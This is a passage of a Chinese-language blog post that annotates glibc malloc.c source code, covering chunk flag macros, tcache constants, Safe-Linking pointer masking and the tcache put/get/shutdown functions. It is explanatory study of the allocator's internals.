class="line"><span class="comment">   is less than PTRDIFF_T.  Returns TRUE and the requested size or MINSIZE in</span></span><br><span class="line"><span class="comment">   case the value is less than MINSIZE on SZ or false if any of the previous</span></span><br><span class="line"><span class="comment">   check fail.  */</span></span><br></pre></td></tr></table></figure><h5 id="标志位相关的宏"><a href="#标志位相关的宏" class="headerlink" title="标志位相关的宏"></a>标志位相关的宏</h5><p>以及chunk的标志位相关的宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   --------------- Physical chunk operations ---------------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with PREV_INUSE when previous adjacent chunk in use */</span></span><br><span class="line"><span class="comment">/*一个测试位，就是之前提到的mchunk_size中的末3位复用部分，最后一位代表了物理相邻的上一个chunk是否被使用*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE 0x1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* extract inuse bit of previous chunk */</span></span><br><span class="line"><span class="comment">/*与操作测试，判断上一个chunk是否被使用*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_inuse(p)       ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span></span><br><span class="line"><span class="comment">/*同，倒数第二位代表了该chunk是否被mmap分配*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_MMAPPED 0x2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*与操作测试，判断该chunk是否是mmap分配的*/</span></span><br><span class="line"><span class="comment">/* check for mmap()&#x27;ed chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained</span></span><br><span class="line"><span class="comment">   from a non-main arena.  This is only set immediately before handing</span></span><br><span class="line"><span class="comment">   the chunk to the user, if necessary.  */</span></span><br><span class="line"><span class="comment">/*同，倒数第二位代表了该chunk是否属于主线程*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*与操作测试，判断该chunk是否属于主线程(0代表属于主线程)*/</span></span><br><span class="line"><span class="comment">/* Check for chunk from main arena.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mark a chunk as not being on the main arena.  */</span></span><br><span class="line"><span class="comment">/*或上 NON_MAIN_ARENA，把一个mark标记为不再属于主线程(*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_non_main_arena(p) ((p)-&gt;mchunk_size |= NON_MAIN_ARENA)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Bits to mask off when extracting size</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Note: IS_MMAPPED is intentionally not masked off from size field in</span></span><br><span class="line"><span class="comment">   macros for which mmapped chunks should never be seen. This should</span></span><br><span class="line"><span class="comment">   cause helpful core dumps to occur if it is tried by accident by</span></span><br><span class="line"><span class="comment">   people extending or adapting this malloc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*所有的测试位，当提取大小时需要被mask off*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="comment">/*忽略测试位，提取大小(简而言之就是mchunk_size末3比特位全部置0)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="comment">/*直接提取mchunk_size*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="comment">/*获取物理相邻的下一个chunk(本chunk的地址+本chunk大小)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="comment">/*物理相邻上一个chunk的size(只有上一个chunk是free的时候才合法)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set the size of the chunk below P.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="comment">/*设置物理相邻上一个chunk的size(该chunk的 mchunk_prev_size)(只有上一个chunk是free的时候才合法)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_prev_size(p, sz) ((p)-&gt;mchunk_prev_size = (sz))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="comment">/*上一个chunk的地址(该chunk的地址减去上一个chunk的大小)(只有上一个chunk是free的时候才合法)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="comment">/*把地址ptr+offset处视为一个chunk*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* extract p&#x27;s inuse bit */</span></span><br><span class="line"><span class="comment">/*检测chunk p是否被使用(也就是p下一个chunk的prev_inuse是否为1)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse(p)      \</span></span><br><span class="line">  ((((mchunkptr) (((<span class="keyword">char</span> *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* set/clear chunk as being inuse without otherwise disturbing */</span></span><br><span class="line"><span class="comment">/* 设置 chunk p状态为被使用 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_inuse(p)      \</span></span><br><span class="line">  ((mchunkptr) (((<span class="keyword">char</span> *) (p)) + chunksize (p)))-&gt;mchunk_size |= PREV_INUSE</span><br><span class="line"><span class="comment">/* 清除 chunk p的被使用状态 */</span></span><br><span class="line">#define clear_inuse(p)      \</span><br><span class="line">  ((mchunkptr) (((<span class="keyword">char</span> *) (p)) + chunksize (p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check/set/clear inuse bits in known places */</span></span><br><span class="line"><span class="comment">/*检查/设置/清楚 某个地方的inuse位*/</span></span><br><span class="line">#define inuse_bit_at_offset(p, s)      \</span><br><span class="line">  (((mchunkptr) (((<span class="keyword">char</span> *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span><br><span class="line"></span><br><span class="line">#define set_inuse_bit_at_offset(p, s)      \</span><br><span class="line">  (((mchunkptr) (((<span class="keyword">char</span> *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)</span><br><span class="line"></span><br><span class="line">#define clear_inuse_bit_at_offset(p, s)      \</span><br><span class="line">  (((mchunkptr) (((<span class="keyword">char</span> *) (p)) + (s)))-&gt;mchunk_size &amp;= ~(PREV_INUSE))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size at head, without disturbing its use bit */</span></span><br><span class="line"><span class="comment">/*在不扰乱测试位的情况下设置大小 (个人感觉应该还需要对s进行一个检测把?)*/</span></span><br><span class="line">#define set_head_size(p, s)  ((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="comment">/*直接更改mchunk_size(有可能改变测试位)*/</span></span><br><span class="line">#define set_head(p, s)       ((p)-&gt;mchunk_size = (s))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size at footer (only when chunk is not in use) */</span></span><br><span class="line"><span class="comment">/*把p+s处的chunk的mchunk_prev_size写为s(只有当chunk p为不被使用的时候才行)*/</span></span><br><span class="line">#define set_foot(p, s)       (((mchunkptr) ((<span class="keyword">char</span> *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span><br><span class="line"></span><br><span class="line">#pragma GCC poison mchunk_size</span><br><span class="line">#pragma GCC poison mchunk_prev_size</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is the size of the real usable data in the chunk.  Not valid for</span></span><br><span class="line"><span class="comment">   dumped heap chunks.  */</span></span><br><span class="line"><span class="comment">/*用户真正使用的部分大小(也就是之前说的数据部分)*/</span></span><br><span class="line">#define memsize(p)                                                    \</span><br><span class="line">  (__MTAG_GRANULE_SIZE &gt; SIZE_SZ &amp;&amp; __glibc_unlikely (mtag_enabled) ? \</span><br><span class="line">    chunksize (p) - CHUNK_HDR_SZ :                                    \</span><br><span class="line">    chunksize (p) - CHUNK_HDR_SZ + (chunk_is_mmapped (p) ? <span class="number">0</span> : SIZE_SZ))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* If memory tagging is enabled the layout changes to accommodate the granule</span></span><br><span class="line"><span class="comment">   size, this is wasteful for small allocations so not done by default.</span></span><br><span class="line"><span class="comment">   Both the chunk header and user data has to be granule aligned.  */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Tcache相关的宏"><a href="#Tcache相关的宏" class="headerlink" title="Tcache相关的宏"></a>Tcache相关的宏</h5><p>还有一些tcache用到的宏(tcache是啥？是一种bin。bin是啥？后面就介绍了)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="comment">/*TCACHE_MAX_BINS应该是定义了最多的条目数量。这个限制不是绝对的，而是可更改的*/</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS64</span></span><br><span class="line"><span class="comment">/*最大的能放进tcache的SIZE，*/</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="comment">/*换算出对应id的tcache bin所收录的chunk的大小*/</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is from chunksize().  */</span></span><br><span class="line"><span class="comment">/*从chunksize()提供的size换算到符合的tcache bin的id*/</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is a user-provided size.  */</span></span><br><span class="line"><span class="comment">/*从用户提供的size换算到符合的tcache bin的id*/</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="comment">/*决定了每个tcache bin所能容纳的chunk大小*/</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Maximum chunks in tcache bins for tunables.  This value must fit the range</span></span><br><span class="line"><span class="comment">   of tcache-&gt;counts[] entries, else they may overflow.  */</span></span><br><span class="line"><span class="comment">/*似乎是全体tcache bins所能容纳的chunk的数量*/</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAX_TCACHE_COUNT UINT16_MAX</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/* Safe-Linking:</span></span><br><span class="line"><span class="comment">   Use randomness from ASLR (mmap_base) to protect single-linked lists</span></span><br><span class="line"><span class="comment">   of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the</span></span><br><span class="line"><span class="comment">   lists&#x27; chunks, and also perform allocation alignment checks on them.</span></span><br><span class="line"><span class="comment">   This mechanism reduces the risk of pointer hijacking, as was done with</span></span><br><span class="line"><span class="comment">   Safe-Unlinking in the double-linked lists of Small-Bins.</span></span><br><span class="line"><span class="comment">   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span></span><br><span class="line"><span class="comment">   larger pages provide less entropy, although the pointer mangling</span></span><br><span class="line"><span class="comment">   still works.  */</span></span><br><span class="line"><span class="comment">/*glibc 2.32后引入的指针加密的操作，主要是一个简单的右移异或的加密方式*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line">  ((__typeof (ptr)) ((((<span class="keyword">size_t</span>) pos) &gt;&gt; <span class="number">12</span>) ^ ((<span class="keyword">size_t</span>) ptr)))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//在malloc.c后半段也有一些关于Tcache的宏</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> key;</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread <span class="keyword">bool</span> tcache_shutting_down = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Process-wide key to try and catch a double-free in the same thread.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uintptr_t</span> tcache_key;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The value of tcache_key does not really have to be a cryptographically</span></span><br><span class="line"><span class="comment">   secure random number.  It only needs to be arbitrary enough so that it does</span></span><br><span class="line"><span class="comment">   not collide with values present in applications.  If a collision does happen</span></span><br><span class="line"><span class="comment">   consistently enough, it could cause a degradation in performance since the</span></span><br><span class="line"><span class="comment">   entire list is checked to check if the block indeed has been freed the</span></span><br><span class="line"><span class="comment">   second time.  The odds of this happening are exceedingly low though, about 1</span></span><br><span class="line"><span class="comment">   in 2^wordsize.  There is probably a higher chance of the performance</span></span><br><span class="line"><span class="comment">   degradation being due to a double free where the first free happened in a</span></span><br><span class="line"><span class="comment">   different thread; that&#x27;s a case this check does not cover.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_key_initialize (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__getrandom (&amp;tcache_key, <span class="keyword">sizeof</span>(tcache_key), GRND_NONBLOCK)</span><br><span class="line">      != <span class="keyword">sizeof</span> (tcache_key))</span><br><span class="line">    &#123;</span><br><span class="line">      tcache_key = random_bits ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __WORDSIZE == 64</span></span><br><span class="line">      tcache_key = (tcache_key &lt;&lt; <span class="number">32</span>) | random_bits ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_thread_shutdown (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  tcache_perthread_struct *tcache_tmp = tcache;</span><br><span class="line"></span><br><span class="line">  tcache_shutting_down = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!tcache)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Disable the tcache and prevent it from being reinitialized.  */</span></span><br><span class="line">  tcache = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Free all of the entries and the tcache itself back to the arena</span></span><br><span class="line"><span class="comment">     heap for coalescing.  */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TCACHE_MAX_BINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> (tcache_tmp-&gt;entries[i])</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache_tmp-&gt;entries[i];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;tcache_thread_shutdown(): &quot;</span></span><br><span class="line">     <span class="string">&quot;unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache_tmp-&gt;entries[i] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  __libc_free (e);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_free (tcache_tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  mstate 